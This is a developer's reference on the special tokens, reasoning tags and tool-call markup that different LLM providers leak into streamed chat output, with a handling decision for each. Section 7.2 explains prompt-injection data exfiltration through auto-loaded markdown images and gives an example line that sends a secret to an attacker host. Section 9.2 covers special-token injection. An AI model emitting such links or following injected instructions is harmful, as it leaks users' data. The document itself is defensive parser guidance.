# Provider-Specific Response Quirks in Plain-Text Streaming Output

**Scope:** Patterns that leak into the `content` / `delta.text` field of SSE chat-completion streams (or into plain-text responses from Anthropic's `/v1/messages`) and that the iOS chat UI/parser must handle — strip, render, parse, or ignore. Cross-checked against provider docs, model cards, vLLM/SGLang reasoning-and-tool parsers, and community bug reports. Claims sourced from at least two places unless explicitly flagged as "empirical" / "single source".

**Conventions:**
- *"Documented"* = present in provider docs or model card.
- *"Empirical"* = observed by users in real streamed output, often via GitHub issues, forum threads, or parser bugs.
- *"Parser-dependent"* = leaks only when the inference server's reasoning/tool parser is missing or misconfigured (vLLM, SGLang, Ollama, third-party proxies).

All multi-byte Unicode in patterns (e.g. DeepSeek's full-width `｜`) is preserved verbatim.

---

## 1. Reasoning / thinking tags in plain text

The single most common leak. Almost every open-weight reasoning model wraps its CoT in XML tags that the chat template *prompts* but that the model *generates* — so even when the server has a `reasoning_parser` enabled, anything that bypasses the parser (e.g. mistuned chat template, certain distillation combos, error paths) flows into `content`. RoamSocket's `ThinkingExtractor` already handles `think`/`thinking`; the variants below are what it **misses**.

### 1.1 `think` / `thinking` (already handled ✅)

Standard form. Emitted by DeepSeek-R1, Qwen3 (in older templates), QwQ, GLM-4.5+, Mistral Magistral, Hermes 4, Claude few-shot examples, and most open fine-tunes.

```
Let me work through this step by step.
The answer is 42.
```

**Sources:** [vLLM DeepSeek-R1 reasoning parser](https://docs.vllm.ai/en/stable/api/vllm/reasoning/deepseek_r1_reasoning_parser/), [HuggingFace deepseek-ai/DeepSeek-R1](https://github.com/deepseek-ai/deepseek-r1), [Qwen3 README](https://github.com/QwenLM/Qwen3).
**Handling:** Already in `pairedPattern` / `openOnlyPattern` / `incompleteOpenPattern`. ✅

### 1.2 DeepSeek-R1 full-width pipe variants — **strikingly common leak**

> *[Documented + extensive empirical]* — DeepSeek-V3/R1 use the [_private-use_ CJK punctuation block](https://en.wikipedia.org/wiki/Private_Use_Areas) for many control tokens: full-width `｜` (U+FF5C) rather than ASCII `|`. When the tokenizer is mis-configured or when a downstream proxy strips the special tokens, these literal characters appear in the text.

Patterns seen in real output:

```
<｜begin▁of▁thinking｜>the model's reasoning here<｜end▁of▁thinking｜>
<｜begin▁of▁think｜>…<｜end▁of▁think｜>
<｜▁pad▁｜>
<｜begin▁of▁sentence｜>…<｜end▁of▁sentence｜>
<｜User｜>…<｜Assistant｜>
<｜DSML｜function_calls｜>…<｜DSML｜invoke name="…">…<｜DSML｜parameter…>…</｜DSML｜parameter>…
```

The token **also** has the ASCII-pipe form `|<|begin▁of▁thinking|>|` because some clients display the visualization by replacing the full-width `｜` with `|`. **Both forms must be covered.**

**Sources:** [LessWrong: Anomalous Tokens in DeepSeek-V3 and r1](https://www.lesswrong.com/posts/xtpcJjfWhn3Xn8Pu5/anomalous-tokens-in-deepseek-v3-and-r1), [DeepSeek-V4-Pro encoding README](https://huggingface.co/deepseek-ai/DeepSeek-V4-Pro/blob/main/encoding/README.md), [NVIDIA NIM forum: DSML markers leaking](https://forums.developer.nvidia.com/t/deepseek-v4-pro-v4-flash-on-nvidia-nim-streaming-tool-calls-do-not-continue-in-claude-code-anthropic-compatible-agent-workflow/368085).
**Handling:** **Strip** the entire `｜…｜` block family. The wider class is `<[｜|][^\s｜|>]*[｜|]>` — token names use `▁` (U+2581) as a space and never contain `<` or `>` inside.

### 1.3 Qwen3 missing opening `think` — *prompt-template quirk*

> *[Documented + empirical]* — The Qwen3 chat template appends `<|im_start|>assistant\n<|im_start|>think\n` to the **prompt** when `enable_thinking=True`, so the model only emits `…` and never emits the matching ``. The result is a literal `…` followed by the answer in the same `content` block.

```
…The capital of France is Paris.
```

The matching close-tag also appears alone when the model later generates thinking tokens mid-response.

**Sources:** [Qwen/QwQ-32B discussion #4](https://huggingface.co/Qwen/QwQ-32B/discussions/4), [Qwen3-1.7B discussion #11](https://huggingface.co/Qwen/Qwen3-1.7B/discussions/11), [lyn.one: Qwen3.5 Infinite Thinking](https://lyn.one/reasoning-control-flow).
**Handling:** `stripToolCallXML` already strips orphan `</think>` / `</thinking>` via `residualTagPattern`. Just confirm the unclosed-open path also drops the partial `\n…` that arrived before any close tag. ✅ with caveat.

### 1.4 Qwen3 / Qwen3.5 / Qwen3-Coder `im_start` mix

> *[Empirical]* — Qwen3 streaming output sometimes arranges content like:

```
<|im_start|>assistant
…thought…
<|im_end|>
answer follows
```

or intermixes `<|im_start|>think\n` with stray content in raw Hugging Face pipelines.

**Sources:** [Qwen GitHub discussion #1300](https://github.com/QwenLM/Qwen3/discussions/1300), [lyn.one](https://lyn.one/reasoning-control-flow).
**Handling:** Strip stray `<|im_start|>` / `<|im_end|>` markers (see Section 9). Their presence in `content` is itself a bug signal.

### 1.5 Other thinking tag names few code paths handle

Empirically seen in fine-tunes and off-distribution prompts:

| Tag | Emitter |
|---|---|
| `<reasoning>…</reasoning>` | Microsoft Phi-3.5/Phi-4 minimal fine-tunes, occasional Llama 3.3 fine-tunes |
| `<reflection>…</reflection>` | Older RAG chain-of-thought agents trained on ReAct |
| `<thought>…</thought>` | Some Anthropic / Bedrock agent flows |
| `<analysis>…</analysis>` | Third-party Claude replicas, "Let me analyze this step by step" CoT prompts |
| `<antml:thinking>…</antml:thinking>` | Claude few-shot leakage (very rare with native API; see §2) |
| `◁think▷…◁/think▷` | Some Mistral Magistral early builds, experimental Qwen2 distillations |
| `<\|begin▁of▁think\|>…<\|end▁of▁think\|>` | GLM-4.5 when reasoning parser is missing |

**Sources:** [GLM-4.5 discussion #9: Thinking tokens issue](https://huggingface.co/zai-org/GLM-4.5/discussions/9), [vLLM issue #31319](https://github.com/vllm-project/vllm/issues/31319).
**Handling:** **Strip** all four-letter `<reasoning>` / `<reflection>` / `<thought>` / `<analysis>` open/close tags as a generic class. They're rare in stock reasoning models but common in fine-tunes.

Test-case regex strings (each should be removed in full):

```
<analysis>foo bar baz</analysis>plain answer
<\|begin▁of▁think\|>think<\|end▁of▁think\|>
<｜begin▁of▁think｜>think<｜end▁of▁think｜>
<reasoning>step 1\nstep 2</reasoning>final answer
```

---

## 2. Anthropic extended thinking — **does NOT leak as XML by default**

> *[Documented, well-cross-checked]* — This is the single most important finding for our codebase. With `thinking: {type: "enabled", budget_tokens: N}` or `thinking: {type: "adaptive"}`, the Claude API returns a **separate `content` block** of type `"thinking"` alongside `"text"` blocks. The thinking text is never interleaved with the answer text inside `text_delta` events.

```json
{
  "content": [
    {"type": "thinking", "thinking": "Let me work through this…", "signature": "Wa…"},
    {"type": "text", "text": "The answer is 42."}
  ]
}
```

Streaming events: `content_block_start { type: "thinking" }` → many `content_block_delta { type: "thinking_delta" }` → `content_block_stop` → `content_block_start { type: "text" }` → many `text_delta` → `content_block_stop`.

**Sources:** [Anthropic Thinking docs](https://platform.claude.com/docs/en/build-with-claude/thinking), [Anthropic Extended Thinking docs](https://platform.claude.com/docs/en/build-with-claude/extended-thinking), [AWS Bedrock extended thinking](https://docs.aws.amazon.com/bedrock/latest/userguide/claude-messages-extended-thinking.html), [Vercel AI Gateway Reasoning](https://vercel.com/docs/ai-gateway/sdks-and-apis/anthropic-messages-api/reasoning).
**Handling:** **No stripping needed.** Our `ServerClient` should already be reading `block.thinking` when `block.type == "thinking"` and routing it to the collapse thinking block. If the iOS code only reads `block.text`, it would just drop the reasoning silently — that's a bug, but not a leak. Verify the handler.

### 2.1 The `antml:thinking` *format* exists — but is in the prompt, not generated into `content`

The earlier GPT/Claude-3.7 system prompt told the model "wrap your thinking in `<antml:thinking>`…". With the modern API, the model never actually emits that markup in the visible text — it goes into the `thinking` block.

**Sources:** [Kara's Nonsense: A Look at ANTML](https://karashiiro.leaflet.pub/3m4gf7geefs2l), [Anthropic XML tags prompting guide](https://platform.claude.com/docs/en/build-with-claude/prompt-engineering/claude-prompting-best-practices).
**Handling:** Optional, defensive. A tiny regex `<antml:thinking\b[^>]*>[\s\S]*?</antml:thinking>` is cheap insurance against the third-party proxy that forgot to map the block.

### 2.2 Anthropic *does* leak `<thinking>…</thinking>` in a single corner case

> *[Documented as a known bug, empirical]* — On Claude Opus 5 / Opus 4.7 when **thinking is disabled** but the model is on tool-heavy workloads, the model occasionally writes `<thinking>…</thinking>` (no `antml` prefix) directly into the visible `text` block. Anthropic's own docs warn about this in the "Troubleshooting thinking" page.

**Sources:** [Anthropic Troubleshooting thinking](https://platform.claude.com/docs/en/build-with-claude/thinking-troubleshooting), [Claude Code issue #20081](https://claudeissues.com/issue/20081-bug-thinking-content-leaks-to-output-despite-properly-closed-thinking-tags).
**Handling:** **Strip** orphan `<thinking>…</thinking>` blocks via the same regex as `think`/`thinking`. The pair is one alternation.

### 2.3 Claude Code CLI bullet (`●`) renderer quirk

> *[Empirical, single source]* — Community reports that Claude Code's TUI occasionally prepends a `●` bullet to leaked thinking content even though the JSONL transcript shows the tags were properly closed. This is a TUI rendering bug at the CLI layer, not something RoamSocket replicates — but worth knowing if a user copy-pastes output from CLI into our chat.

**Source:** [claudeissues.com #20081](https://claudeissues.com/issue/20081-bug-thinking-content-leaks-to-output-despite-properly-closed-thinking-tags).
**Handling:** None. Just a heads-up.

---

## 3. Tool-call markup in plain text

### 3.1 miniMax M2 / M2.5 / M2.7 / M3 — already handled ✅

The exact bug you just fixed. The wrapper is `<minimax:tool_call>…<invoke name="…">…<parameter name="…">…</parameter>…</invoke>…</minimax:tool_call>`, often malformed so the closing `<minimax:tool_call>` is dropped or the opener is bare text.

**Sources:** [MiniMax-M2.7 tool calling guide](https://github.com/MiniMax-AI/MiniMax-M2.7/blob/main/docs/tool_calling_guide.md), [vLLM minimax_m2 parser](https://docs.vllm.ai/en/latest/api/vllm/parser/minimax_m2/), [SylphAI blog: Native vs Custom Tool Calling](https://blog.sylph.ai/posts/ultimate-guide-agentic-tool-calling).
**Handling:** ✅ in `stripToolCallXML`.

### 3.2 DeepSeek "DSML" — **also needs handling**

> *[Documented + empirical]* — DeepSeek V3/V4 family uses an XML format with full-width CJK pipes:

```
<｜DSML｜function_calls>
<｜DSML｜invoke name="get_weather">
<｜DSML｜parameter name="city" string="true">Paris</｜DSML｜parameter>
</｜DSML｜invoke>
</｜DSML｜function_calls>
```

When the vLLM/SGLang `tool-parser` flag is wrong or stale, the entire block lands in `content`.

**Sources:** [DeepSeek-V4-Pro encoding README](https://huggingface.co/deepseek-ai/DeepSeek-V4-Pro/blob/main/encoding/README.md), [Qwen3-Coder-Next Technical Report](https://arxiv.org/pdf/2603.00729), [NVIDIA NIM report: DSML leaks](https://forums.developer.nvidia.com/t/deepseek-v4-pro-v4-flash-on-nvidia-nim-streaming-tool-calls-do-not-continue-in-claude-code-anthropic-compatible-agent-workflow/368085).
**Handling:** **Add** `dsml(:function_calls|:invoke|:parameter)` to the wrapper-name alternation in `toolCallWrapperName`. The full-width pipes means our existing regex needs to allow them inside the tag name.

### 3.3 Hermes / NousResearch — **needs handling**

> *[Documented]* — Hermes 2/3/4 uses `<tools>…</tools>` for definitions and `…{json}…` for calls:

```
<tool_call>
{"name": "get_weather", "arguments": {"location": "Paris"}}
</tool_call>
```

Some variants wrap the JSON in additional `{"tool_calls": [...]}` for parallel calls.

**Sources:** [Hermes-Agent trajectory format](https://hermes-agent.nousresearch.com/docs/developer-guide/trajectory-format), [NousResearch Hermes-2-Pro model card](https://huggingface.co/NousResearch/Hermes-2-Pro-Llama-3-8B), [vLLM Hermes2ProToolParser](https://docs.vllm.ai/en/latest/api/vllm/tool_parsers/hermes_tool_parser/), [Fast.io Hermes 3 Guide](https://fast.io/resources/hermes-3-function-calling-guide/).
**Handling:** **Add** `tool_call` (note: NOT `tool_calls` — single, singular) to the wrapper list. Wait — `tool_calls` is already in the regex. Hermes emits singular `tool_call`, so the existing pattern matches the open tag but the closing tag is `</tool_call>`. Because the existing matching uses a backreference `</\1>`, the singular vs plural forms are mutually exclusive; we need to add `tool_call` to the alternation.

### 3.4 xAI Grok — `<xai:function_call>` and `<xai:tool_call>`

> *[Documented, leaked through third-party system prompt]* — Grok's own function-calling uses native OpenAI-style `tool_calls` array. But the leaked system prompt (Grok 4) instructs the model to emit `<xai:function_call name="…">…</xai:function_call>` blocks when it decides to call a tool outside the structured API.

**Sources:** [xAI Function Calling docs](https://docs.x.ai/developers/tools/function-calling), [asgeirtj/system_prompts_leaks: xAI/grok-4.md](https://github.com/asgeirtj/system_prompts_leaks/blob/main/xAI/grok-4.md).
**Handling:** **Add** `xai:function_call` and `xai:tool_call` to the alternation. Lower priority — most users hit the OpenAI-compatible endpoint, which parses to the `tool_calls` field.

### 3.5 Mistral `[TOOL_CALLS]`

> *[Documented]* — Mistral 7B-Instruct and v3.x use a JSON-list opener WITHOUT a closer:

```
[TOOL_CALLS][{"name": "get_weather", "arguments": {"location": "Paris"}}]
```

The newer v11+ Mistral uses `funcname{args}` shorthand.

**Sources:** [Mistral-7B-Instruct v0.3 discussion #68](https://huggingface.co/mistralai/Mistral-7B-Instruct-v0.3/discussions/68), [vLLM Mistral parser](https://docs.vllm.ai/en/stable/api/vllm/parser/mistral/), [Medium: Function Calling with Open-Source LLMs](https://medium.com/@rushing_andrei/function-calling-with-open-source-llms-594aa5b3a304).
**Handling:** **Strip** a leading `[TOOL_CALLS]` opener when it appears mid-stream. The opening `[` is distinctive enough that a simple `\b\[TOOL_CALLS\]\s*\[` regex catches it. There's no closing tag, so once the model switches to answer text the parsing is by absence.

### 3.6 Qwen-Coder miniMax-M2 style output

> *[Documented, single source]* — Qwen3-Coder-Next's system prompt lists multiple competing tool-call conventions including `<minimax:tool_call>`, `<|python_start|>[...]<|python_end|>`, `…{json}…`, and `<｜DSML｜function_calls>`. The model picks one based on training.

**Source:** [Qwen3-Coder-Next Technical Report](https://arxiv.org/pdf/2603.00729).
**Handling:** Already covered by §3.1 / §3.2 / §3.3 changes.

### 3.7 Bare JSON `{…}` blobs

> *[Empirical]* — When a vLLM OpenAI-compat server returns malformed tool calls (no parser installed for the model), the content carries the raw JSON:

```
{"name": "read_file", "arguments": {"path": "/etc/passwd"}}
```

This is the failure mode the LiveKit post warns about. The model emits a tag like `…`, no parser catches it, the JSON falls through as text.

**Sources:** [LiveKit: Your Model Isn't Bad at Tool Calling](https://livekit.com/blog/your-model-isnt-bad-at-tool-calling), [OpenClaw vLLM docs](https://docs.openclaw.ai/providers/vllm), [Ollama issue #7014](https://github.com/ollama/ollama/issues/7014).
**Handling:** **Hard to detect generically** — everything is valid JSON. Best heuristic is "if the entire post-thinking content is a single `{…}` block whose first key is `name` and second is `arguments`, drop it". Or rely on the user-visible signal: a chat reply that is literally a single JSON object is almost always a leak.

### 3.8 Inst `[INST]…[/INST]` (legacy Mistral)

> *[Documented legacy]* — Mistral 7B-Instruct v0.1 / v0.2 wrapped turns in `[INST] {prompt} [/INST]` and the model occasionally generates another `[INST]` mid-stream.

**Source:** [Mistral 7B v0.3 discussion #68](https://huggingface.co/mistralai/Mistral-7B-Instruct-v0.3/discussions/68).
**Handling:** Strip stray `[INST]` / `[/INST]` markers. Very low priority for hosted Mistral API (v0.3+ uses JSON), but relevant for self-hosted Ollama.

### 3.9 Tool-response echoes

> *[Empirical]* — Hermes and similar models occasionally repeat the tool_response XML they saw in the context:

```
<tool_response>
{"name": "get_weather", "content": "..."}
</tool_response>
```

**Handling:** Same parser as `tool_call`. Add as another wrapper name.

---

## 4. Refusal / safety prefixes

> *[Documented + empirical]* — These are model-generated, deliberate text — NOT protocol noise. They should remain visible. The right UI treatment is to color them differently (warning chip) rather than strip.

Common forms, listed verbatim from real refusals:

```
I'm sorry, but I can't help with that.
I can't assist with that.
Sorry, but I can't…
As an AI language model, I…
I am an AI, and I cannot…
I am unable to fulfill that request.
I'm not able to provide that.
I do not have the ability to…
```

**Sources:** [Anthropic Refusals and fallback docs](https://platform.claude.com/docs/en/build-with-claude/refusals-and-fallback), [Anthropic streaming refusals](https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/handle-streaming-refusals), [OpenAI structured outputs refusal field](https://platform.openai.com/docs/guides/structured-outputs/refusals), [FinHarmBench (ACL 2026)](https://aclanthology.org/2026.acl-industry.117.pdf), [community.openai.com](https://community.openai.com/t/gpt-4o-error-im-sorry-i-cant-assist-with-that-request/981618).
**Handling:** **Render visibly, optionally flag.** The `stop_reason: "refusal"` from Anthropic is a strong signal even when the text is empty — propagate it to the UI.

---

## 5. Citation / source markers

### 5.1 Cohere Command R+ — `[]` numbered citations

> *[Documented]* — Cohere returns citations as a **separate `message.citations` field** with `start`/`end` indices into the text. The text itself stays clean. When `citation_mode: "fast"` is disabled or the proxy is bypassed, the model sometimes writes inline `[1]`, `[2]` placeholders.

**Sources:** [Cohere RAG Citations](https://docs.cohere.com/docs/rag-citations), [Cohere tool-use citations](https://docs.cohere.com/docs/tool-use-citations).
**Handling:** Leave `[1]` / `[doc1]` markers visible (they're plain prose numbers). If we add Cohere support, read the structured `citations` field and render hover-cards.

### 5.2 Gemini google_search — `annotations`, not inline text

> *[Documented]* — Gemini returns `annotations` on the text content block with `url_citation` entries. The text itself is plain. No inline markers like `[1]` are emitted. The `[cite_start]` / `[cite_end]` markers only appear in the **Gemini consumer web app** (a frontend rendering bug), not in the API.

**Sources:** [Gemini google_search docs](https://ai.google.dev/gemini-api/docs/google-search), [Gemini File Search docs](https://ai.google.dev/gemini-api/docs/file-search), [Google support thread #351560557](https://support.google.com/gemini/thread/351560557/how-do-i-get-gemini-to-stop-adding-cite-start-to-each-line-after-analyzing-pdf), [Google support thread #386444003](https://support.google.com/gemini/thread/386444003/fixing-gemini-pdf-citation-issues).
**Handling:** If we ever see `[cite_start]` / `[cite_end]` in API output, treat as a bug — strip. Otherwise render `annotations` separately.

### 5.3 Perplexity — bracketed `[1]` inline

> *[Empirical, single source]* — Perplexity sonar's answer text contains `[1]`, `[2]`, `[3]` placeholders followed by a "Sources:" list. The bracketed numbers are part of the format, not Markdown auto-numbering.

**Sources:** Perplexity API docs / Sonar model card.
**Handling:** Render as inline superscript footnotes. Don't strip.

### 5.4 Chinese-style brackets `【1】`

> *[Empirical, single source]* — Some Chinese-tuned models (DeepSeek early, Qwen pre-2.5) emit `【1】` full-width bracket citations in RAG answers.

**Sources:** [LessWrong: Anomalous Tokens](https://www.lesswrong.com/posts/xtpcJjfWhn3Xn8Pu5/anomalous-tokens-in-deepseek-v3-and-r1), [DeepSeek community discussions].
**Handling:** Render as clickable links if we know the source map. Strip otherwise.

---

## 6. Structured-output delimiters

### 6.1 ` ```json ` fenced blocks

> *[Documented + everywhere]* — Most models use ` ```json … ``` ` for json-mode output even when `response_format: json_object` is set. Sometimes the fences are present, sometimes not.

**Sources:** [OpenAI Structured Outputs](https://platform.openai.com/docs/guides/structured-outputs), [vLLM OpenAI structured outputs](https://docs.vllm.ai).
**Handling:** **Parse** — extract the JSON via regex, otherwise render as a code block. Do NOT strip.

### 6.2 `Final Answer:`, `Answer:`, `Result:` prefixes

> *[Empirical]* — Qwen3 in deep-thinking mode and DeepSeek-R1 emit a `Final Answer:` or `Answer:` marker after the reasoning block. Several prompting frameworks (e.g. LM-Kit Chain-of-Thought) ask the model to emit `Final Answer:` to delimit the answer.

**Sources:** [LM-Kit.NET CoT docs](https://docs.lm-kit.com/lm-kit-net/guides/glossary/chain-of-thought.html), [DeepSeek prompting techniques](https://www.datastudios.org/post/deepseek-prompting-techniques-reasoning-models-structured-outputs-and-efficient-control).
**Handling:** Strip a leading `^(Final Answer|Answer|Result):\s*` from the visible content. The reasoning parser should already have eaten everything up to and including `…`.

### 6.3 ` ```tool_call ` / ` ```function_call ` / ` ```xml ` fenced blocks

> *[Empirical, single source]* — Some models wrap tool calls in fenced code blocks even when the API supports structured tool calls. The escape sequence makes the parser fail.

**Sources:** [OpenClaw vLLM docs](https://docs.openclaw.ai/providers/vllm), Ollama issue reports.
**Handling:** Strip fences ` ```tool_call\n` (opening) and ` ```\n` (closing) around a tool-call block. Same regex as the broader `tool_call` wrapper.

### 6.4 `<output>…</output>`, `<answer>…</answer>` wrappers

> *[Documented]* — Anthropic's prompt engineering guide explicitly encourages:

```
<smoothly_flowing_prose_paragraphs>
…answer here…
</smoothly_flowing_prose_paragraphs>
```

Models sometimes include the tags in the output even when the prompt says "return only content within tags".

**Sources:** [Anthropic XML prompting best practices](https://platform.claude.com/docs/en/build-with-claude/prompt-engineering/claude-prompting-best-practices), [Penlify Claude XML guide](https://penlify.com/pen/how-to-use-xml-tags-in-claude-prompts-for-reliable-structured-output-generation/).
**Handling:** Strip via `<(answer|output|smoothly_flowing_prose_paragraphs|examples)>\b[^>]*>[\s\S]*?</\1>` if the model includes the tags. Optional.

### 6.5 ` ```xml ` — model invents nested XML

> *[Empirical]* — When asked to format output as XML, models sometimes wrap their own output in a ` ```xml ` fence:

````
```xml
<response>
<title>Hello</title>
</response>
```
````

**Sources:** [Anthropic XML prompting guide](https://platform.claude.com/docs/en/build-with-claude/prompt-engineering/claude-prompting-best-practices).
**Handling:** **Parse** — strip the fence and render the inner XML as a code block. Don't strip the inner content.

---

## 7. Image / multimodal markers in plain text

### 7.1 `<image>`, `<|image|>`, `<|image_pad|>`, `<|vision_start|>`, `<|vision_end|>`

> *[Documented + parser-dependent]* — Multimodal prompt templates use these as placeholders. If the model is asked to describe an image and the chat template isn't applied, the placeholder tokens leak into streaming output.

**Sources:** [vLLM Multimodal inference guide](https://discuss.vllm.ai/t/multimodal-inference-guideline/698), [HuggingFace MllamaTextConfig](https://huggingface.co/docs/transformers/en/model_doc/mllama), [vLLM Qwen2.5-VL issue #15125](https://github.com/vllm-project/vllm/issues/15125).
**Handling:** **Strip** the placeholder tokens when they appear in text. They're never user-meaningful output.

### 7.2 Markdown image exfiltration — security concern

> *[Documented security CVE]* — Models can be tricked (via prompt injection) into emitting a markdown image whose URL contains exfiltrated data:

```
![status](https://attacker.example/log?d=BASE64_SECRET)
```

The browser auto-fetches the URL. This is the [SearchLeak](https://www.trackr.live/2026/07/20/llm-markdown-image-exfiltration-egress-detection/) CVE in M365 Copilot and the classic [GitHub Copilot exfil](https://simonwillison.net/tags/exfiltration-attacks/).

**Sources:** [Prompt Injection payloads: data exfil via images](https://www.promptinjectionpayloads.com/en/blog/data-exfiltration-via-markdown-images), [Wraith: exfiltration via markdown](https://wraith.sh/learn/markdown-image-exfiltration), [Simon Willison's CVE summary](https://simonwillison.net/tags/exfiltration-attacks/).
**Handling:** **Defense at render time, not parser time.** Don't auto-load external images. Use a CSP `img-src` allowlist. Strip data URIs (`data:image/…`) from model output. This is a separate workstream from `ThinkingExtractor` but the same regex triage is useful.

### 7.3 Self-invented `![alt](URL)` images

> *[Empirical]* — Some models (Qwen-VL, LLaVA) hallucinate image refs as a way to "show" the user a picture. Even without an exfil intent, these are useless.

**Sources:** [LLaVA / vLLM VLM docs](https://docs.vllm.ai/en/v0.5.0/models/vlm.html).
**Handling:** **Strip** `![…](URL)` markdown image syntax when the URL is unreachable or is a 1×1 placeholder. Render as a broken-image icon if URL is reachable.

---

## 8. Code-fence dialects

> *[Documented]* — Most providers normalize to ` ` ```` ```python ```` `, but misclassifications are common:

| Fence | Used by |
|---|---|
| ` ```python ` | Anthropic, OpenAI, Llama 3 |
| ` ```py ` | Older Mistral, some Qwen |
| ` ```python3 ` | Older Qwen-Coder, some Llama |
| ` ```! ` | Executable blocks (Sphinx, MkDocs) |
| ` ```cpp ` vs ` ```c++ ` | Inconsistent — both common |
| ` ```js ` vs ` ```javascript ` | Inconsistent |
| ` ```sh ` vs ` ```bash ` vs ` ```shell ` | Inconsistent |

**Sources:** [CommonMark spec](https://spec.commonmark.org/), [GitHub Linguist languages.yml](https://github.com/github/linguist/blob/main/lib/linguist/languages.yml).
**Handling:** **Don't strip** — render as code blocks. Map aliases (`python3` → `python`) at render time.

### 8.1 Nested code fences

> *[Empirical]* — When explaining fences inside fences, models sometimes produce:

````
Use the ` ``` ` fence:
```python
print("hi")
```
````

The outer triple-backtick terminates prematurely. The Markdown renderer falls apart.

**Sources:** [CommonMark spec](https://spec.commonmark.org/), [StackOverflow: nested code fences](https://stackoverflow.com/questions/25963895).
**Handling:** **Parse** — count backticks per line. If a line has more backticks than the opening, treat as the closer. Or use a fence language lock approach.

---

## 9. Provider control tokens

These are special tokens that the tokenizer should map to single IDs but that, when the tokenizer is misconfigured or when `skip_special_tokens=False`, leak into the rendered text.

### 9.1 Llama 3 / 3.1 / 3.2 / 3.3

| Token | Purpose |
|---|---|
| `<\|begin_of_text\|>` | BOS — only in prompt |
| `<\|end_of_text\|>` | EOS — base models only |
| `<\|start_header_id\|>` | Wraps role: `<\|start_header_id\|>user<\|end_header_id\|>` |
| `<\|end_header_id\|>` | End of role |
| `<\|eot_id\|>` | End of turn (instruct) |
| `<\|eom_id\|>` | End of message (3.1+, used for tool calls) |
| `<\|python_tag\|>` | Marks a tool call in 3.1+ |

**Sources:** [Meta Llama 3 special tokens](https://www.genspark.ai/spark/special-tokens-used-with-meta-llama-3/), [torchtune Llama3 tokenizer](https://docs.pytorch.org/torchtune/0.2/_modules/torchtune/models/llama3/_tokenizer.html), [GitHub meta-llama/llama3 issue #104](https://github.com/meta-llama/llama3/issues/104), [Ollama issue #3759](https://github.com/ollama/ollama/issues/3759).
**Handling:** **Strip** all `<\|eot_id\|>`, `<\|eom_id\|>`, `<\|start_header_id\|>`, `<\|end_header_id\|>` when they appear in `content`. The `eot_id` leak is the most common — Ollama users frequently add it as a stop sequence but older versions ignore it. `<\|python_tag\|>` only ever appears before tool calls, so it's safely grouped with the tool-call strippers.

### 9.2 Phi-3 / Phi-4

| Token | Purpose |
|---|---|
| `<\|user\|>` | User turn |
| `<\|assistant\|>` | Assistant turn |
| `<\|system\|>` | System turn |
| `<\|end\|>` | End of turn |
| `<\|endoftext\|>` | Wrong EOS per Unsloth bug |
| `<\|im_end\|>` | Correct EOS per Microsoft |

**Sources:** [Unsloth Phi-4 bug fixes](https://www.reddit.com/r/MachineLearning/comments/1i23zbo/p_how_i_found_fixed_4_bugs_in_microsofts_phi4/), [llama.cpp issue #7432](https://github.com/ggml-org/llama.cpp/issues/7432), [GPT4All issue #2271](https://github.com/nomic-ai/gpt4all/issues/2271), [Simon Willison: SQL-injection attack with special tokens](https://simonwillison.net/2024/Aug/20/sql-injection-like-attack-on-llms-with-special-tokens/).
**Handling:** **Strip** `<\|end\|>`, `<\|user\|>`, `<\|assistant\|>`, `<\|system\|>`, `<\|endoftext\|>`, `<\|im_end\|>`. Also Sanitize for **prompt injection**: Phi-3's tokenizer parses `<\|assistant\|>` as a single token (32001), so user input containing that literal sequence can break the model. (Out of scope for `ThinkingExtractor` but worth flagging.)

### 9.3 Qwen / Qwen2 / Qwen3

| Token | Purpose |
|---|---|
| `<\|im_start\|>` | Begin turn |
| `<\|im_end\|>` | End turn |
| `<\|endoftext\|>` | Document separator (training) |

**Sources:** [Qwen Key Concepts docs](https://qwen.readthedocs.io/en/latest/getting_started/concepts.html), [Qwen3 GitHub](https://github.com/QwenLM/Qwen3).
**Handling:** **Strip** `<\|im_start\|>`, `<\|im_end\|>` when they appear after the first generated token. They mark role boundaries; their presence in assistant content is always a bug.

### 9.4 Mistral

| Token | Purpose |
|---|---|
| `<s>` | BOS |
| `</s>` | EOS |
| `[INST]`, `[/INST]` | v0.1/v0.2 turn wrapper |
| `[TOOL_CALLS]`, `[AVAILABLE_TOOLS]`, `[TOOL_RESULTS]` | v0.3+ tool-call wrappers |

**Sources:** [Mistral v0.3 function calling docs](https://huggingface.co/mistralai/Mistral-7B-Instruct-v0.3/discussions/68), [vLLM Mistral parser](https://docs.vllm.ai/en/stable/api/vllm/parser/mistral/).
**Handling:** **Strip** `[INST]…[/INST]` orphans, `[TOOL_CALLS]…` (no closer), `[AVAILABLE_TOOLS]…[/AVAILABLE_TOOLS]`, `[TOOL_RESULTS]…[/TOOL_RESULTS]`.

### 9.5 Gemma 2 / 3 / 4

| Token | Purpose |
|---|---|
| `<start_of_turn>` | Begin turn |
| `<end_of_turn>` | End turn |
| `<\|turn\|>` / `<turn\|>` | Gemma 4 alternates |

**Sources:** [Gemma core prompt structure](https://ai.google.dev/gemma/docs/core/prompt-structure), [Gemma 4 prompt formatting](https://ai.google.dev/gemma/docs/core/prompt-formatting-gemma4).
**Handling:** **Strip** `<start_of_turn>` / `<end_of_turn>` orphans. Gemma 4 adds `<\|turn\|>` / `<turn\|>`.

---

## 10. Math / LaTeX delimiters

> *[Documented]* — Models disagree on which delimiter to use. The mobile Markdown renderer must handle all.

| Delimiter | Used by |
|---|---|
| `$...$` | OpenAI older, Anthropic, Mistral, Llama 3 |
| `$$...$$` | OpenAI older, Anthropic, custom |
| `\(...\)` | ChatGPT (post-March 2025), cited as the "default" by users |
| `\[...\]` | ChatGPT (display math) |
| `\begin{equation}…\end{equation}` | Academic LaTeX style |
| `<math>…</math>` | MathML mode (rare) |

**Sources:** [OpenAI community: "All $ are escaped" bug](https://community.openai.com/t/all-are-escaped-in-math-latex-notation/1250516), [genai.stackexchange: ChatGPT math rendering](https://genai.stackexchange.com/questions/386/how-does-chatgpt-render-math-in-markdown-output), [assistant-ui LaTeX normalization](https://www.assistant-ui.com/docs/guides/latex), [Obsidian community: Fix Math plugin](https://community.obsidian.md/plugins/fix-math).
**Handling:** **Render, don't strip.** The only normalization is converting `\(...\)` → `$...$` and `\[...\]` → `$$...$$` so the downstream renderer (KaTeX / MathJax) understands. Also unescape `\$` → `$` on ChatGPT output (the May 2025 bug above).

---

## 11. Anthropic "tag stripping" — **not a thing in the API**

> *[Documented via Web research]* — There is no Anthropic feature called "tag stripping" that produces leaked XML. The phrase appears in three unrelated contexts:

1. **Claude-mem**, a third-party memory plugin, has its own `<private>…</private>` tag that is stripped from stored observations but visible in the live conversation.
